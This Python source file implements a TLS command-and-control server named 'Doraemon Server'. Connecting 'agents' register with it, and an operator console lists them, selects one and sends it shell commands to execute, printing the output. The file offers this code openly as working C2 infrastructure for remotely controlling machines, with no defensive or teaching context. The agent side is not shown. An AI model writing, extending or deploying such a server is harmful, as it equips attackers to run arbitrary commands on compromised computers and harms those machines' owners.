# taken from https://stackoverflow.com/questions/23828264/how-to-make-a-simple-multithreaded-socket-server-in-python-that-remembers-client

import socket
import ssl

import os
import json
from threading import Thread

from src.agents.agent import Agent


# server certificate defaults
CERTCHAIN_PATH = "./cert/certchain.pem"
PRIVATE_KEY_PATH = "./cert/private.key"

# defaults and server codes
CLIENT_NOT_FOUND_CODE = -1
BUFF_SIZE = 2048

# Server Version
SERVER_VERSION = "1.1.0"


# A server class that handles different clients simultaneously
class ThreadedServer(object):
    def __init__(self, host: str = "localhost", port: int = 443, certchain: str = CERTCHAIN_PATH, privatekey: str = PRIVATE_KEY_PATH, use_ssl: bool = True) -> None:
        '''
        This function will initiate the server's main socket and its ssl layer
        '''
        # if server uses ssl
        self.use_ssl = use_ssl

        # creating the server's ssl context
        if self.use_ssl:
            self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.context.load_cert_chain(certchain, privatekey)

        # saving server's information
        self.host = host
        self.port = port

        # establishing server's main secure socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

        print(f"[DEBUG]\tDoraemon Server's SSL configured: {self.use_ssl}")

        # initializing an active clients list
        self.active_clients: list[Agent] = list()


    def listen(self) -> None:
        '''
        Function will make the server's main socket listen to new connections
        '''
        # can handle 5 unaccepted connections at a single moment
        self.sock.listen(5)

        if self.use_ssl:
            # wrap the socket with our ssl context
            self.sock = self.context.wrap_socket(self.sock, server_side=True)

        print(f"[INFO]\tDoraemon Server v{SERVER_VERSION} is listening on {self.host}::{self.port}")

        # starting server's console
        clients_handler_thread = Thread(target=self.handleClients)
        clients_handler_thread.start()

        while True:
            # when a new client connects, a thread is allocated to handle the client
            client, address = self.sock.accept()
            print(f"\n[INFO]\tNew agent connected from {address[0]}::{address[1]}")

            # adding a new client to server's list
            client_thread = Thread(target=self.add_client, args=(client, address))
            client_thread.start()


    ## Clients list section
    def add_client(self, client: socket.socket, address) -> None:
        '''
        Adds a new client to server's clients list
        '''
        # when connecting to socket, server is expecting to a bunch of data to initiate the client
        strClientData: str = client.recv(BUFF_SIZE).decode()
        jsonClientData: dict = json.loads(strClientData)

        print(f"[DEBUG]\t{address[0]}::{address[1]}'s data - {strClientData}")

        # create a new client agnet and add it to server's list
        newClient: Agent = Agent(client, address, jsonClientData)
        self.active_clients.append(newClient)


    ## removes a client from server's list
    def remove_client(self, client_index: int) -> None:
        '''
        Removes a client from active clients list
        '''
        print(f"[INFO]\tClient disconnected: [{client_index}]")
        del self.active_clients[client_index]


    def list_clients_and_select(self) -> int:
        '''
        Function will list the connected clients and ask the server user to choose
        '''
        # list clients
        print(f"Clients connected to {self.host}::{self.port} CNC server:")


        # if there are no clients
        clients_list_len = len(self.active_clients)
        if clients_list_len == 0:
            print("\tThere are no connected clients at the moment.")
            return CLIENT_NOT_FOUND_CODE
        
        # if there are clients, list them
        else:
            for i in range(len(self.active_clients)):
                print(f"[{i}] {self.active_clients[i].display()}")

        # input validation
        while True:
            try:
                chosen_client_index = int(input("Enter client's index you would like to select: "))
            except ValueError:
                print("Client number must be an integer.")
            else:
                if chosen_client_index not in range(clients_list_len):
                    print("Invalid client number")
                else:
                    break

        return chosen_client_index


    ## Helper functions
    def handleClients(self) -> None:
        '''
        The function will handle each client seperatly and without interrupting the server
        '''
        while True:
            print("### WELCOME TO CNC CONSOLE ###")
            input("Press Enter to print connected users")
            number = self.list_clients_and_select()
            if number == CLIENT_NOT_FOUND_CODE:
                continue

            os.system("cls")
            self.handleChosenClient(number)
            input("Press Enter to go back to menu")
            os.system("cls")


    def handleChosenClient(self, client_number: int) -> None:
        '''
        Function will contact the client to perform cmd command
        '''
        clients_str = self.active_clients[client_number].display()
        print("================================")
        print(f"In contact with:\n{clients_str}")
        print("================================")

        # execute command
        command_string: str = input(">>> ")
        try:
            command_output: str = self.active_clients[client_number].execute(command_string)
            if command_output:
                print(command_output)
            else:
                print(f"Client {clients_str} is not connected anymore.")
                self.remove_client(client_number)
        except:
            self.remove_client(client_number)